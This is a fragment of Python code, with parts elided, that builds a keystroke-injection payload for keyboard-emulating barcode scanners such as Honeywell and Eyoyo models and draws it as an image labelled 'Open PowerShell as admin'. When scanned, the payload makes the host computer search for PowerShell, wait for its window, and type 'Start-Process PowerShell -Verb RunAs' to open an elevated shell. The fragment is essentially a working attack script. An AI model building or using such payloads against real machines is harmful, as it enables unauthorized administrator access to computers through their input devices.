...
TxString = TxString + 'powershe' # Search string for PowerShell
...
# Add delay, waiting for the PowerShell to open
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (7 * 8)
else: TxString = TxString + Ins * (28 * 8)
...
# Add delay, waiting for the PowerShell window to take control
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (3 * 8)
else: TxString = TxString + Ins * (12 * 8)

# Add commands to open the PowerShell as the administrator
TxString = (TxString + 
            'Start-Process PowerShell -Verb RunAs'+Enter+ # Enter the command to open the command line shell as the administrator
            'exit'+Enter) # Exit PowerShell
...
draw.text((0, 0), ControlCodes + ':' + 'Open PowerShell as admin',fill = 'black', font = font)
